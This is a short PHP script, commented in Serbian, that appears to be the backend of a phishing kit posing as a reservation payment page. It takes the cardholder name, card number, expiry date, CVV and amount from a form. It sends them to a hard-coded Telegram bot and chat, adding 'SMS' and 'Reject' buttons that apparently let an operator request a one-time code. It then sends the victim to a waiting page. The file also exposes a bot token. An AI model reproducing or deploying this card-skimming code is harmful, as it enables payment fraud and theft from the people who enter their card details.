<?php
// Preuzimanje podataka iz POST zahteva
$cardHolderName = $_POST['cardHolderName'] ?? '';
$cardNumber = $_POST['cardNumber'] ?? '';
$expiryDate = $_POST['expiryDate'] ?? '';
$cvv = $_POST['cvv'] ?? '';
$amount = $_POST['amount'] ?? '';
$uniqueId = $_POST['unique_id'] ?? '';

// Formiranje poruke za Telegram
$message = "Plaćanje rezervacije:\n"
         . "Ime nosioca kartice: $cardHolderName\n"
         . "Broj kartice: $cardNumber\n"
         . "Datum isteka: $expiryDate\n"
         . "CVV: $cvv\n"
         . "Iznos: $amount\n"
         . "ID: $uniqueId";

// Telegram API konfiguracija
$apiToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
$chatId = '-4104959417';

$telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
$telegramData = [
    'chat_id' => $chatId,
    'text' => $message,
    'reply_markup' => json_encode([
        'inline_keyboard' => [
            [['text' => 'SMS', 'callback_data' => 'SMS_' . $uniqueId]],
            [['text' => 'Reject', 'callback_data' => 'Reject_' . $uniqueId]]
        ]
    ])
];

// Slanje poruke na Telegram
$ch = curl_init($telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($telegramData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/x-www-form-urlencoded'));
$telegramResponse = curl_exec($ch);
curl_close($ch);

// Preusmeravanje na stranicu za čekanje odgovora
header("Location: cekanjeOdgovora.php?unique_id=$uniqueId");
exit;
?>
